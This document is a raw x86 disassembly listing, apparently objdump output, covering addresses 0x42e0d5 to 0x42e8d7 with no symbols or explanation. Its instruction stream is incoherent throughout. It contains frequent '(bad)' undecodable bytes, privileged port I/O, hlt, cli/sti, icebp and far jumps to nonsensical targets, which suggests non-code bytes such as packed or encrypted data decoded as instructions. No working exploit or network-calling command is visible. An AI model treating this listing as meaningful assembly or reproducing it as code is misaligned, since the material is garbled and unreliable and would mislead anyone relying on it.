  42e0d5:	mov    ah,0xf1
  42e0d7:	stc    
  42e0d8:	enter  0xb8c5,0xf1
  42e0dc:	not    bl
  42e0de:	hlt    
  42e0df:	fdivr  st(7),st
  42e0e1:	pop    es
  42e0e2:	out    0xfb,al
  42e0e4:	add    ebp,esp
  42e0e6:	hlt    
  42e0e7:	or     ecx,esp
  42e0e9:	lds    eax,FWORD PTR [edx+ecx*8]
  42e0ec:	ret    0xf100
  42e0ef:	scas   al,BYTE PTR es:[edi]
  42e0f0:	mov    cl,0xac
  42e0f2:	loop   0x42e0a7
  42e0f4:	scas   al,BYTE PTR es:[edi]
  42e0f5:	cli    
  42e0f6:	out    0xf9,al
  42e0f8:	(bad)  
  42e0f9:	mov    ecx,0xd8d9fbb4
  42e0fe:	test   DWORD PTR [eax],0xc2f6e2b6
  42e104:	in     al,0xc0
  42e106:	fsubr  st(1),st
  42e108:	cld    
  42e109:	div    ah
  42e10b:	cli    
  42e10c:	ret    0xa0a
  42e10f:	out    dx,eax
  42e110:	in     eax,0xc7
  42e112:	shl    DWORD PTR [ebx-0x131b3340],1
  42e118:	aam    0xd9
  42e11a:	mov    ecx,0xc2ccf1d3
  42e11f:	fdivrp st(6),st
  42e121:	rol    BYTE PTR [edi],1
  42e123:	add    esp,ebp
  42e125:	icebp  
  42e126:	cmc    
  42e127:	out    0x9,eax
  42e129:	aam    0x8
  42e12b:	add    eax,0xe8c009e3
  42e130:	mov    eax,0xf4efbed1
  42e135:	cmc    
  42e136:	xlat   BYTE PTR ds:[ebx]
  42e137:	aam    0xe4
  42e139:	lods   eax,DWORD PTR ds:[esi]
  42e13a:	mov    edi,0xf9cfefe9
  42e13f:	iret   
  42e140:	call   0xff43c14c
  42e145:	add    dl,dl
  42e147:	ror    DWORD PTR [ebx],0xfa
  42e14a:	into   
  42e14b:	out    0xc4,al
  42e14d:	fild   DWORD PTR [ecx+eax*8]
  42e150:	mov    esp,0xf7d2dec0
  42e155:	leave  
  42e156:	mov    edx,0xbafed0e7
  42e15b:	int3   
  42e15c:	shl    BYTE PTR [esi+esi*8-0x13120e3f],1
  42e163:	loope  0x42e142
  42e165:	mov    ecx,0xfdc0f0d0
  42e16a:	out    0xdd,al
  42e16c:	add    cl,dl
  42e16e:	adc    ebp,DWORD PTR [eax-0x2c162142]
  42e174:	(bad)  
  42e175:	leave  
  42e176:	sti    
  42e177:	cmc    
  42e178:	cli    
  42e179:	jmp    0xfebb:0xdffaf9d2
  42e180:	sti    
  42e181:	icebp  
  42e182:	icebp  
  42e183:	mov    ebp,0xe2e7f000
  42e188:	add    dl,bh
  42e18a:	add    ecx,esp
  42e18c:	in     al,0x3
  42e18e:	add    bl,dh
  42e190:	mov    cl,0xcb
  42e192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e193:	rcl    dh,1
  42e195:	leave  
  42e196:	enter  0xdbf2,0xf7
  42e19a:	into   
  42e19b:	fcomip st,st(6)
  42e19d:	in     al,dx
  42e19e:	mov    ah,0xd8
  42e1a0:	mov    edi,0xf9e5c3f3
  42e1a5:	push   es
  42e1a6:	mov    esp,0xff0ec9d6
  42e1ab:	into   
  42e1ac:	out    0xc9,al
  42e1ae:	fcmove st,st(6)
  42e1b0:	shr    ecx,0xd7
  42e1b3:	in     al,dx
  42e1b4:	fadd   st(5),st
  42e1b6:	(bad)  
  42e1b7:	mov    cl,0xca
  42e1b9:	(bad)  
  42e1ba:	fnstsw WORD PTR [ecx-0x41290638]
  42e1c0:	(bad)  
  42e1c1:	sar    DWORD PTR [edi-0x1fb4222],cl
  42e1c7:	retf   
  42e1c8:	(bad)  
  42e1ca:	add    bl,al
  42e1cc:	jmp    0xdd09beae
  42e1d1:	int3   
  42e1d2:	enter  0xd2e2,0xb6
  42e1d6:	stc    
  42e1d7:	(bad)  
  42e1d9:	idiv   BYTE PTR [edx-0x36020124]
  42e1df:	clc    
  42e1e0:	fldln2 
  42e1e2:	(bad)  
  42e1e3:	(bad)  
  42e1e4:	fdiv   st,st(0)
  42e1e6:	add    eax,DWORD PTR [edi]
  42e1e8:	leave  
  42e1e9:	pop    es
  42e1ea:	fprem1 
  42e1ec:	dec    BYTE PTR [ebx]
  42e1ee:	out    dx,al
  42e1ef:	loope  0x42e1e1
  42e1f1:	fucomip st,st(3)
  42e1f3:	lods   eax,DWORD PTR ds:[esi]
  42e1f4:	in     al,dx
  42e1f5:	out    0xcd,eax
  42e1f7:	out    dx,al
  42e1f8:	shl    cl,cl
  42e1fa:	(bad)
  42e1fd:	mov    edi,0xdcf5d6d3
  42e202:	mov    ebp,0xcb0bc3e7
  42e207:	ret    
  42e208:	(bad)  
  42e209:	aad    0xdd
  42e20b:	into   
  42e20c:	in     eax,0xdc
  42e20e:	add    al,0xdc
  42e210:	mov    ebp,0xe7cbcde6
  42e215:	shl    DWORD PTR [ebx-0x29484747],1
  42e21b:	call   0xcd11ce14
  42e220:	loope  0x42e1e1
  42e222:	out    dx,al
  42e223:	idiv   BYTE PTR [edx+0xb09f4db]
  42e229:	lds    ecx,FWORD PTR [esi]
  42e22b:	mov    edx,0xe8c90a02
  42e231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e232:	(bad)  
  42e233:	mov    cl,0xd1
  42e235:	mov    ch,0xef
  42e237:	mov    bh,0xe4
  42e23a:	repz (bad) 
  42e23c:	cli    
  42e23d:	rol    BYTE PTR [ecx],cl
  42e23f:	shl    dl,1
  42e241:	ror    ebp,0xf6
  42e244:	shl    bh,0xe2
  42e247:	rol    DWORD PTR [ebx],0xea
  42e24a:	jmp    0x101ce230
  42e24f:	in     eax,dx
  42e250:	out    0xb1,eax
  42e252:	jmp    0xf8d6:0xcdeaacc2
  42e259:	mov    ebx,0xf8cddacd
  42e25e:	mov    ebx,0xd7d201f0
  42e263:	(bad)  
  42e264:	std    
  42e265:	or     eax,DWORD PTR [eax+eax*8]
  42e268:	enter  0xdb06,0xf5
  42e26c:	fsubr  st,st(3)
  42e26e:	add    dh,ah
  42e270:	out    0xdd,eax
  42e272:	sar    DWORD PTR [ebp-0x303f291c],cl
  42e278:	iret   
  42e279:	fidivr DWORD PTR [eax-0x28034125]
  42e27f:	aam    0xd5
  42e281:	fninit 
  42e283:	rol    dl,0xfb
  42e286:	add    ah,dh
  42e288:	(bad)  
  42e289:	out    0xc7,al
  42e28b:	enter  0xeae1,0xdf
  42e28f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e290:	shl    bh,cl
  42e292:	jmp    0x42e28b
  42e294:	mov    ah,0xc9
  42e296:	sti    
  42e297:	out    0xdf,eax
  42e299:	int    0xc6
  42e29b:	mov    bl,0xc4
  42e29d:	not    esi
  42e29f:	clc    
  42e2a0:	add    ecx,edi
  42e2a2:	rol    BYTE PTR ds:0x1e501f9,1
  42e2a8:	in     al,0xfd
  42e2aa:	loop   0x42e27b
  42e2ac:	(bad)  
  42e2ad:	inc    eax
  42e2af:	lock jmp 0x42e271
  42e2b2:	loop   0x42e296
  42e2b4:	not    dl
  42e2b6:	enter  0xd3bb,0xf8
  42e2ba:	fcmove st,st(4)
  42e2bc:	std    
  42e2bd:	in     eax,dx
  42e2be:	add    ecx,esi
  42e2c0:	std    
  42e2c1:	int3   
  42e2c2:	rol    BYTE PTR [edx],1
  42e2c4:	jecxz  0x42e2b8
  42e2c6:	loopne 0x42e2c9
  42e2c8:	(bad)  
  42e2c9:	stc    
  42e2ca:	fld    DWORD PTR [esi]
  42e2cc:	push   es
  42e2cd:	fild   DWORD PTR [edx]
  42e2cf:	fidiv  WORD PTR [edx-0x37110a0f]
  42e2d5:	jmp    0xf0f7abcc
  42e2da:	in     al,dx
  42e2db:	retf   0xf3cc
  42e2de:	aam    0xba
  42e2e0:	rol    BYTE PTR [esi],0xf2
  42e2e3:	cli    
  42e2e4:	add    eax,0xe3d4ebfd
  42e2e9:	aad    0xc6
  42e2eb:	ret    
  42e2ec:	(bad)  
  42e2ed:	fsubr  st(5),st
  42e2ef:	stos   BYTE PTR es:[edi],al
  42e2f0:	in     al,dx
  42e2f1:	jecxz  0x42e2c6
  42e2f3:	loope  0x42e2ec
  42e2f5:	in     eax,dx
  42e2f6:	mov    ebx,0xd3d6aec8
  42e2fb:	repnz in al,0xd2
  42e2fe:	stc    
  42e2ff:	mov    ebp,0xd606bdcf
  42e304:	(bad)  
  42e305:	jmp    0xd806:0xc0e2dfc6
  42e30c:	or     cl,BYTE PTR ds:0xe8d1c7e0
  42e312:	mov    cl,0xc1
  42e314:	jmp    0xee28be0c
  42e319:	int3   
  42e31a:	jmp    0x42e2ee
  42e31c:	aam    0xb1
  42e31e:	mov    ah,0xc1
  42e320:	cld    
  42e321:	fcmovnu st,st(1)
  42e323:	stc    
  42e324:	cli    
  42e325:	in     al,0xa
  42e327:	or     ah,al
  42e329:	out    0x0,eax
  42e32b:	cmc    
  42e32c:	in     eax,dx
  42e32d:	les    ecx,FWORD PTR [esi]
  42e32f:	mov    esi,0xd5d3e9e5
  42e334:	int3   
  42e335:	repz mov dh,0xe0
  42e338:	int    0xd0
  42e33a:	cmc    
  42e33b:	ror    ebp,1
  42e33d:	idiv   ebx
  42e33f:	(bad)  
  42e340:	fcmovb st,st(3)
  42e342:	in     eax,dx
  42e343:	fld    st(4)
  42e345:	neg    cl
  42e347:	jmp    0x509:0xd4de0a09
  42e34e:	add    bh,al
  42e350:	mov    esp,0xedecebca
  42e355:	mov    cl,0xf0
  42e357:	shl    BYTE PTR [edi-0x343b464a],cl
  42e35d:	in     eax,dx
  42e35e:	fxch   st(7)
  42e360:	stc    
  42e361:	add    ecx,edx
  42e363:	add    BYTE PTR [ecx+eiz*8-0x37180a23],bh
  42e36a:	fucomip st,st(1)
  42e36c:	stc    
  42e36d:	add    eax,0xe6accbe9
  42e372:	shl    edx,0xc4
  42e375:	in     al,0xda
  42e377:	out    0xc7,al
  42e379:	mov    al,0xcc
  42e37b:	retf   
  42e37c:	hlt    
  42e37d:	mov    esi,0xdbe0f4ed
  42e382:	icebp  
  42e383:	cli    
  42e384:	add    dl,ah
  42e386:	ret    0xdb08
  42e389:	(bad)  
  42e38a:	call   0xc94beb5a
  42e38f:	test   eax,0xb1acb1c8
  42e394:	retf   0xc1d2
  42e397:	mov    ah,0xf7
  42e399:	icebp  
  42e39a:	mov    esi,0xb8ffe9cc
  42e39f:	fld    st(2)
  42e3a1:	cli    
  42e3a2:	add    ebp,esi
  42e3a4:	lock icebp 
  42e3a6:	stc    
  42e3a7:	aam    0xd9
  42e3a9:	jmp    0xeec8:0xce05cbf9
  42e3b0:	jmp    0xf4f7:0xb2b7ccc7
  42e3b7:	leave  
  42e3b8:	stc    
  42e3b9:	shr    dl,cl
  42e3bb:	fiadd  DWORD PTR [ebx]
  42e3bd:	sti    
  42e3be:	mov    edx,0xd5bef500
  42e3c3:	add    esi,eax
  42e3c5:	sti    
  42e3c6:	add    eax,ebx
  42e3c8:	(bad)  
  42e3c9:	retf   0xe506
  42e3cc:	jmp    0x42e3cc
  42e3ce:	in     al,0xab
  42e3d0:	mov    eax,0xcbf0d4c7
  42e3d6:	div    DWORD PTR [ebx-0x242d4826]
  42e3dc:	mov    ch,0xf9
  42e3de:	int3   
  42e3df:	mov    ebp,0xfebcfbda
  42e3e4:	in     al,dx
  42e3e5:	retf   
  42e3e6:	add    ch,dl
  42e3e8:	retf   0xc0e1
  42e3eb:	push   cs
  42e3ec:	std    
  42e3ed:	cld    
  42e3ee:	fucomp st(5)
  42e3f0:	bnd ret 
  42e3f2:	shl    DWORD PTR [ebp-0x61b3d1b],cl
  42e3f8:	mov    dl,0xfb
  42e3fa:	int3   
  42e3fb:	ror    dl,1
  42e3fd:	leave  
  42e3fe:	hlt    
  42e3ff:	ret    
  42e400:	(bad)  
  42e402:	mov    edi,0xdedfd7bd
  42e407:	stc    
  42e408:	vpmaddwd xmm5,xmm3,xmm3
  42e40c:	jecxz  0x42e40b
  42e40e:	add    ecx,esi
  42e410:	loope  0x42e3ee
  42e412:	jmp    0x42e3c3
  42e414:	mov    ah,0xbb
  42e416:	mov    ch,0xf9
  42e418:	clc    
  42e419:	mov    dh,0xd0
  42e41b:	cmc    
  42e41c:	(bad)  
  42e41e:	add    bl,ch
  42e420:	iret   
  42e421:	(bad)  
  42e423:	mov    esp,0xe106ebd2
  42e428:	fninit 
  42e42a:	in     eax,0xf8
  42e42c:	into   
  42e42d:	fadd   DWORD PTR [ecx]
  42e42f:	int    0xf7
  42e431:	shl    edi,cl
  42e433:	retf   0xe0db
  42e436:	mov    dl,0xf3
  42e438:	xlat   BYTE PTR ds:[ebx]
  42e439:	(bad)  
  42e43a:	sti    
  42e43b:	cli    
  42e43c:	lock (bad) 
  42e43f:	(bad)  
  42e440:	shl    edx,cl
  42e442:	loopne 0x42e43d
  42e444:	or     esp,ecx
  42e446:	rcr    edi,0xf4
  42e449:	add    ebp,eax
  42e44b:	jmp    0xdd1eec5c
  42e450:	jmp    0xc2cf:0xd7cdd2b7
  42e457:	loopne 0x42e438
  42e459:	(bad)  
  42e45a:	mov    edi,0xe1e9b5bf
  42e45f:	clc    
  42e460:	neg    dl
  42e462:	mov    DWORD PTR ds:0xc5fce1e4,0x90fc1c6
  42e46c:	adc    eax,DWORD PTR [edx]
  42e46e:	call   0xee0f915f
  42e473:	jmp    0x42e44c
  42e475:	jmp    0xcade:0xf2d8d9e8
  42e47c:	out    dx,al
  42e47d:	add    cl,dl
  42e47f:	int3   
  42e480:	ror    bh,1
  42e482:	(bad)  
  42e483:	std    
  42e484:	out    0xe3,al
  42e486:	fld    st(6)
  42e488:	clc    
  42e489:	add    ebx,edx
  42e48b:	retf   0xe302
  42e48e:	(bad)  
  42e48f:	(bad)  
  42e490:	int3   
  42e491:	test   al,0xeb
  42e493:	imul   ah
  42e495:	mov    dh,0xcd
  42e497:	int    0xd5
  42e499:	rol    ebp,1
  42e49b:	out    dx,eax
  42e49c:	mov    eax,0xbefbcae9
  42e4a1:	(bad)  
  42e4a2:	in     al,dx
  42e4a3:	fdivr  st,st(3)
  42e4a5:	or     edx,esi
  42e4a7:	add    al,0xe9
  42e4a9:	fucomip st,st(5)
  42e4ab:	out    0xc,al
  42e4ad:	add    edi,ebp
  42e4af:	in     eax,0xe5
  42e4b1:	(bad)  
  42e4b2:	jmp    0xc9b3:0xcac0b7f3
  42e4b9:	in     eax,0xb9
  42e4bb:	xlat   BYTE PTR ds:[ebx]
  42e4bc:	out    dx,eax
  42e4bd:	inc    bl
  42e4bf:	add    ah,bh
  42e4c1:	std    
  42e4c2:	add    BYTE PTR [ebx-0x381f2207],bh
  42e4c8:	add    ah,dl
  42e4ca:	fiadd  WORD PTR [ebx]
  42e4cc:	fsub   st,st(0)
  42e4ce:	cli    
  42e4cf:	in     al,0xed
  42e4d1:	(bad)  
  42e4d3:	shr    BYTE PTR [edx-0x51491f16],cl
  42e4d9:	mov    ch,0xff
  42e4db:	call   0xe1ffc0d4
  42e4e0:	mov    ecx,0xd9f3c0e1
  42e4e5:	div    ecx
  42e4e7:	jmp    0x42e4a7
  42e4e9:	add    al,ch
  42e4eb:	cmc    
  42e4ec:	(bad)
  42e4ef:	out    0xbe,eax
  42e4f1:	mov    bh,0xb2
  42e4f3:	lods   eax,DWORD PTR ds:[esi]
  42e4f4:	enter  0xdbbb,0xf0
  42e4f8:	rol    ch,cl
  42e4fa:	icebp  
  42e4fb:	cli    
  42e4fc:	add    edx,esi
  42e4fe:	sar    edi,cl
  42e500:	mov    dh,0xc7
  42e502:	in     eax,dx
  42e503:	mov    esp,0xdcf1c5c3
  42e508:	fild   DWORD PTR [esi]
  42e50a:	fdiv   st(0),st
  42e50c:	cld    
  42e50d:	add    eax,0xf7c7bdd3
  42e512:	repnz xlat BYTE PTR ds:[ebx]
  42e514:	icebp  
  42e515:	(bad)  
  42e516:	rcl    eax,1
  42e518:	repnz xlat BYTE PTR ds:[ebx]
  42e51a:	repnz test esi,0xd1dff9cc
  42e521:	cld    
  42e522:	stc    
  42e523:	(bad)  
  42e525:	in     al,0xe6
  42e527:	ror    edx,1
  42e529:	fld    st(5)
  42e52b:	(bad)
  42e52e:	fmul   st,st(7)
  42e530:	test   eax,0xe8bcf0eb
  42e535:	mov    cl,0xe7
  42e537:	in     eax,dx
  42e538:	xlat   BYTE PTR ds:[ebx]
  42e539:	aad    0xf6
  42e53b:	mov    bl,0xfc
  42e53d:	mov    esp,0xce00f8fb
  42e542:	ret    0xf4e7
  42e545:	jmp    0x42e52c
  42e547:	push   es
  42e548:	fcom   st(7)
  42e54a:	out    0xef,eax
  42e54c:	fld    DWORD PTR [edx]
  42e54e:	jmp    FWORD PTR [esi-0x383c2830]
  42e554:	repnz sar ebx,0xf4
  42e558:	mov    dl,0xf7
  42e55a:	int    0xf7
  42e55c:	mov    eax,0xe3f3f3ff
  42e561:	add    ah,cl
  42e563:	(bad)  
  42e564:	out    0xe6,al
  42e566:	fcmovnu st,st(7)
  42e568:	add    al,0xe3
  42e56a:	hlt    
  42e56b:	jmp    0xf32fe53f
  42e570:	faddp  st(5),st
  42e572:	mov    bl,0xf6
  42e574:	(bad)
  42e577:	mov    bh,0xb4
  42e579:	test   ah,0xec
  42e57c:	icebp  
  42e57d:	mov    esp,0xcdd4bbfc
  42e582:	int3   
  42e583:	rol    BYTE PTR [edx],0xdd
  42e586:	out    0x9,al
  42e588:	out    dx,eax
  42e589:	fstp   st(7)
  42e58b:	stc    
  42e58c:	cli    
  42e58d:	out    0xec,eax
  42e58f:	stos   DWORD PTR es:[edi],eax
  42e590:	test   al,0xa9
  42e592:	rol    cl,0xdb
  42e595:	mov    bl,0xcd
  42e597:	stc    
  42e598:	cli    
  42e599:	mov    edx,0xcfefe4f5
  42e59e:	mov    esi,0xbdb9d9ba
  42e5a3:	in     eax,dx
  42e5a4:	fdivrp st(6),st
  42e5a6:	in     eax,0xc6
  42e5a8:	or     bh,al
  42e5aa:	aam    0xc5
  42e5ac:	jmp    0xd305afb3
  42e5b1:	in     eax,0xee
  42e5b3:	stos   DWORD PTR es:[edi],eax
  42e5b4:	leave  
  42e5b5:	ror    ah,0xb4
  42e5b8:	jmp    0xb6f69a6d
  42e5bd:	fnstsw WORD PTR [ebp-0x121c0a25]
  42e5c3:	aam    0xdc
  42e5c5:	aam    0x2
  42e5c7:	fdivp  st(0),st
  42e5c9:	add    ecx,DWORD PTR [eax]
  42e5cb:	loop   0x42e5c1
  42e5cd:	add    ch,bh
  42e5cf:	fadd   st,st(3)
  42e5d1:	mov    bh,0xdc
  42e5d3:	mov    al,0xf2
  42e5d5:	loopne 0x42e5bd
  42e5d7:	imul   ch
  42e5d9:	lock in al,0xea
  42e5dc:	mov    ah,0xc8
  42e5de:	(bad)  
  42e5e0:	rcl    cl,0xc7
  42e5e3:	clc    
  42e5e4:	cld    
  42e5e5:	clc    
  42e5e6:	jmp    0xe4e2:0xe801fcdd
  42e5ed:	(bad)  
  42e5ef:	mov    esp,0xb6e5dfe2
  42e5f4:	scas   al,BYTE PTR es:[edi]
  42e5f5:	aad    0xf9
  42e5f7:	into   
  42e5f8:	stc    
  42e5f9:	xlat   BYTE PTR ds:[ebx]
  42e5fa:	stc    
  42e5fb:	std    
  42e5fc:	fstp   TBYTE PTR [ecx-0x3e242234]
  42e602:	sar    cl,0xfc
  42e605:	cli    
  42e606:	aad    0xea
  42e608:	stc    
  42e609:	mov    ebp,0xe9cbdef6
  42e60e:	cli    
  42e60f:	mov    eax,0xcfded2a9
  42e614:	shl    ebp,0xda
  42e617:	out    dx,eax
  42e618:	mov    ebx,0xcdd6f9fb
  42e61d:	jmp    0xf0ce:0x1b8f5cf
  42e624:	icebp  
  42e625:	rcr    edx,0xd5
  42e628:	xlat   BYTE PTR ds:[ebx]
  42e629:	in     eax,0xe6
  42e62b:	sti    
  42e62c:	enter  0xf804,0xdf
  42e630:	retf   0xdcf6
  42e633:	(bad)  
  42e634:	jmp    0x42e5ea
  42e636:	(bad)  
  42e637:	int    0xf1
  42e639:	(bad)  
  42e63a:	fcmovne st,st(3)
  42e63c:	(bad)  
  42e63d:	mov    esp,0xd5f5bbdb
  42e642:	ret    
  42e643:	out    0xd0,al
  42e645:	add    eax,0xc9e1e7dc
  42e64a:	hlt    
  42e64b:	ret    
  42e64c:	loopne 0x42e64f
  42e64e:	or     al,0xa7
  42e650:	mov    esp,0xf5c0e4ac
  42e655:	(bad)  
  42e656:	hlt    
  42e657:	rcl    ecx,1
  42e659:	mov    bh,0xf1
  42e65b:	(bad)  
  42e65d:	(bad)  
  42e65f:	(bad)  
  42e660:	mov    eax,0xfb03f1cc
  42e665:	or     esp,edx
  42e667:	cld    
  42e668:	jmp    0x8ec:0xe2e205c6
  42e66f:	in     eax,dx
  42e670:	mov    eax,0xc0ede5de
  42e675:	into   
  42e676:	ret    0xc6f0
  42e679:	shl    esi,1
  42e67b:	shl    bh,1
  42e67d:	int3   
  42e67e:	aam    0xba
  42e680:	(bad)  
  42e681:	fxch   st(6)
  42e683:	(bad)  
  42e684:	repz lock in eax,0xc3
  42e688:	(bad)  
  42e689:	dec    eax
  42e68b:	jmp    0xeed8:0xebeaefcc
  42e692:	mov    esp,0xe8edd1d1
  42e697:	jmp    0xd9bd:0xcac5d8f6
  42e69e:	jmp    0xd632d776
  42e6a3:	(bad)  
  42e6a5:	fucomip st,st(3)
  42e6a7:	in     al,0xc8
  42e6a9:	mov    BYTE PTR [eax],0xe7
  42e6ac:	int3   
  42e6ad:	enter  0xf3f3,0xd7
  42e6b1:	retf   
  42e6b2:	iret   
  42e6b3:	(bad)  
  42e6b4:	in     eax,0xca
  42e6b6:	mov    ah,0xc1
  42e6b8:	mov    ecx,0xdcc5f0f7
  42e6bd:	mov    ebp,0xfedfcedf
  42e6c2:	jecxz  0x42e6b0
  42e6c4:	repnz inc BYTE PTR ds:0xc4090bd0
  42e6cb:	or     edx,ebx
  42e6cd:	in     al,0xf9
  42e6cf:	fmulp  st(3),st
  42e6d1:	in     eax,0xdd
  42e6d3:	mov    bl,0xb0
  42e6d5:	ret    
  42e6d6:	mov    dl,0xd1
  42e6d8:	(bad)  
  42e6da:	(bad)  
  42e6dc:	fst    st(1)
  42e6de:	int3   
  42e6df:	in     al,dx
  42e6e0:	dec    edi
  42e6e2:	pop    es
  42e6e3:	(bad)  
  42e6e4:	xlat   BYTE PTR ds:[ebx]
  42e6e5:	(bad)  
  42e6e6:	(bad)  
  42e6e7:	loope  0x42e6e3
  42e6e9:	out    dx,al
  42e6ea:	jecxz  0x42e6e1
  42e6ec:	stc    
  42e6ed:	(bad)  [eax+eiz*8]
  42e6f0:	in     eax,dx
  42e6f1:	mov    dl,0xed
  42e6f3:	scas   al,BYTE PTR es:[edi]
  42e6f4:	stos   BYTE PTR es:[edi],al
  42e6f5:	cmc    
  42e6f6:	into   
  42e6f7:	loope  0x42e6c5
  42e6f9:	lods   eax,DWORD PTR ds:[esi]
  42e6fa:	repnz fcmovu st,st(7)
  42e6fd:	leave  
  42e6fe:	aam    0x2
  42e700:	pop    es
  42e701:	mov    ebp,0xe7e303fd
  42e706:	fcomp  st(4)
  42e708:	in     eax,0xf9
  42e70a:	or     ecx,ecx
  42e70c:	int3   
  42e70d:	call   0xf80ec4fa
  42e712:	shl    ecx,cl
  42e714:	jmp    0xf4bf:0xf1afc7f7
  42e71b:	in     al,0xeb
  42e71d:	iret   
  42e71e:	cli    
  42e71f:	in     al,dx
  42e720:	cmc    
  42e721:	sti    
  42e722:	mov    DWORD PTR [ebx],0xbfde3d6
  42e728:	hlt    
  42e729:	mov    ebp,0xdffae5d5
  42e72e:	pop    es
  42e72f:	(bad)  
  42e730:	repnz icebp 
  42e732:	into   
  42e733:	fadd   st(0),st
  42e735:	int3   
  42e736:	mov    ebx,0xdbb8bacd
  42e73b:	rcr    ecx,cl
  42e73d:	into   
  42e73e:	jmp    0x5fd:0xc6d4f6dc
  42e745:	out    0xf1,al
  42e747:	not    ebp
  42e749:	add    esp,esi
  42e74b:	loope  0x42e757
  42e74d:	(bad)  
  42e74e:	stc    
  42e74f:	int    0xac
  42e751:	mov    dl,0xb6
  42e753:	leave  
  42e754:	rol    dh,0xb0
  42e757:	shr    edx,0xf4
  42e75a:	leave  
  42e75b:	idiv   BYTE PTR [edx-0x1f052914]
  42e761:	mov    ecx,0x4d2d2bf
  42e766:	icebp  
  42e767:	ret    
  42e768:	jmp    0x4eef70
  42e76d:	or     al,0xe1
  42e76f:	leave  
  42e770:	shr    edi,cl
  42e772:	test   al,0xe7
  42e774:	mov    bl,0xcf
  42e776:	mov    edx,0xcbefb2f9
  42e77b:	cld    
  42e77c:	fadd   st(3),st
  42e77e:	out    dx,eax
  42e77f:	sti    
  42e780:	into   
  42e781:	ret    
  42e782:	add    bl,ch
  42e784:	cli    
  42e785:	mov    ebp,0xf603dcd1
  42e78a:	add    ah,cl
  42e78c:	std    
  42e78d:	jecxz  0x42e76e
  42e78f:	repnz fsub st,st(5)
  42e792:	into   
  42e793:	out    dx,al
  42e794:	hlt    
  42e795:	icebp  
  42e796:	mov    bh,0xf0
  42e798:	ror    ah,1
  42e79a:	repz mov eax,0xd401b4f9
  42e7a0:	lock out dx,al
  42e7a2:	test   ah,0xc7
  42e7a5:	aam    0xf0
  42e7a7:	out    0xd5,al
  42e7a9:	jecxz  0x42e788
  42e7ab:	add    bh,bl
  42e7ad:	retf   
  42e7ae:	jecxz  0x42e7a0
  42e7b0:	jecxz  0x42e789
  42e7b2:	mov    cl,0xaf
  42e7b4:	mov    bl,0xb5
  42e7b6:	mov    edx,0xeeefe0ed
  42e7bb:	mov    ecx,0xbcbecacd
  42e7c0:	jecxz  0x42e7a1
  42e7c2:	icebp  
  42e7c3:	ret    0x2e4
  42e7c6:	ret    0xf6e5
  42e7c9:	sti    
  42e7ca:	hlt    
  42e7cb:	pop    es
  42e7cc:	in     eax,0xfb
  42e7ce:	out    dx,al
  42e7cf:	mov    dl,0xb3
  42e7d1:	ret    0xe6c7
  42e7d4:	shl    BYTE PTR [ebp+eax*8-0x29094431],1
  42e7db:	(bad)  
  42e7dd:	repnz sti 
  42e7df:	call   0xdc05c3c4
  42e7e4:	in     eax,0xe1
  42e7e6:	repnz add DWORD PTR [edx],eax
  42e7e9:	or     bh,al
  42e7eb:	aam    0xcf
  42e7ed:	in     al,dx
  42e7ee:	iret   
  42e7ef:	in     al,dx
  42e7f0:	fucom  st(0)
  42e7f2:	fsubp  st(6),st
  42e7f4:	out    0xf7,al
  42e7f6:	out    0xc4,al
  42e7f8:	aam    0xdf
  42e7fa:	jmp    0xd50bcbd5
  42e7ff:	(bad)  
  42e800:	icebp  
  42e801:	std    
  42e802:	rcl    ebp,1
  42e804:	mov    esi,0xf7e1d5eb
  42e809:	cli    
  42e80a:	or     bl,bl
  42e80c:	fsub   st(4),st
  42e80e:	add    esi,DWORD PTR [edx-0x37223810]
  42e814:	mov    al,0xe0
  42e816:	mov    ah,0xbb
  42e818:	clc    
  42e819:	clc    
  42e81a:	jmp    0x42e7d4
  42e81c:	shl    ebx,cl
  42e81e:	fnstenv [edi-0x13f8fe46]
  42e824:	(bad)  
  42e825:	jmp    0x1d6:0xcaf7f4ff
  42e82c:	add    cl,bl
  42e82e:	(bad)  
  42e82f:	jmp    0xc4d2:0xb2b6beb8
  42e836:	lock in al,dx
  42e838:	(bad)
  42e83b:	int3   
  42e83c:	int    0xbd
  42e83e:	repz add esi,esp
  42e841:	cld    
  42e842:	imul   ch
  42e844:	in     al,0x2
  42e846:	in     al,0xc3
  42e848:	cmc    
  42e849:	(bad)  
  42e84a:	stc    
  42e84b:	fmul   QWORD PTR [eax]
  42e84d:	jmp    0x42e827
  42e84f:	mov    edi,0xc1c2d6b1
  42e854:	shl    bl,1
  42e856:	loopne 0x42e819
  42e858:	mov    cl,0xd3
  42e85a:	sti    
  42e85b:	mov    eax,0xeff7bdd1
  42e860:	xlat   BYTE PTR ds:[ebx]
  42e861:	cli    
  42e862:	(bad)  
  42e863:	cmc    
  42e864:	add    al,ch
  42e866:	(bad)  
  42e868:	mov    esi,0xe4def5f5
  42e86d:	(bad)  
  42e86e:	in     eax,dx
  42e86f:	iret   
  42e870:	ret    0xb3a8
  42e873:	call   0xd22ad72d
  42e878:	(bad)  
  42e879:	(bad)  
  42e87a:	out    dx,al
  42e87b:	sti    
  42e87c:	mov    ecx,0xdcdb03fa
  42e881:	test   esp,0xc0e0c1db
  42e887:	or     ecx,ebp
  42e889:	clc    
  42e88a:	clc    
  42e88b:	loope  0x42e899
  42e88d:	jecxz  0x42e891
  42e88f:	stos   BYTE PTR es:[edi],al
  42e890:	shl    bl,1
  42e892:	lods   al,BYTE PTR ds:[esi]
  42e893:	in     eax,0xf1
  42e895:	mov    dh,0xc0
  42e897:	mov    dh,0xc6
  42e899:	mov    edx,0xe2b4b8b6
  42e89e:	jmp    0xd9f5:0xe1e2f8de
  42e8a5:	vpaddq xmm5,xmm4,xmm3
  42e8a9:	inc    esp
  42e8ab:	out    dx,eax
  42e8ac:	int    0xca
  42e8ae:	out    0xe4,al
  42e8b0:	loopne 0x42e879
  42e8b2:	scas   al,BYTE PTR es:[edi]
  42e8b3:	test   bl,0xb4
  42e8b6:	mov    dh,0xef
  42e8b8:	out    0xc7,al
  42e8ba:	mov    dh,0xd6
  42e8bc:	into   
  42e8bd:	cmc    
  42e8be:	mov    esi,0xe7e3b6f9
  42e8c3:	fninit 
  42e8c5:	fcomp  st(3)
  42e8c7:	cmc    
  42e8c8:	jmp    0x42e8d8
  42e8ca:	or     eax,0xeb05fa04
  42e8cf:	iret   
  42e8d0:	mov    esp,0xf5e2c1c0
  42e8d6:	iret   
  42e8d7:	jmp    0x42e889
